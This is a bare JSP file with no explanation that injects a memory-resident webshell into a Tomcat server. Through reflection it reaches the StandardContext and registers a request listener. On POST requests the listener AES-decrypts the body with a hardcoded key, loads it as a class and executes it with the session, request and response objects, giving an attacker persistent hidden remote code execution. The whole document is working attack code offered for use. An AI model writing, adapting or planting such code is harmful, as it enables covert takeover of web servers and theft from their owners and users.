<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.io.BufferedReader" %>

<%
    class S implements ServletRequestListener{

        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }

            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

        }
        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {

            try {
                if (request.getMethod().equals("POST")) {
                    String k = "e45e329feb5d925b";
                    request.getSession().setAttribute("u", k);
                    javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                    c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
                    java.util.Map<String, Object> pageContext = new java.util.HashMap<String, Object>();
                    pageContext.put("session", request.getSession());
                    pageContext.put("request", request);
                    pageContext.put("response", response);
                    java.io.BufferedReader bf = request.getReader();
                    byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));
                    String sb = new String(evilClassBytes);
                    Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                    Object a = evilClass.newInstance();
                    a.equals(pageContext);
                    return;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }
%>

<%
    ServletContext servletContext =  request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    out.println("inject success");
    S servletRequestListener = new S();
    standardContext.addApplicationEventListener(servletRequestListener);

%>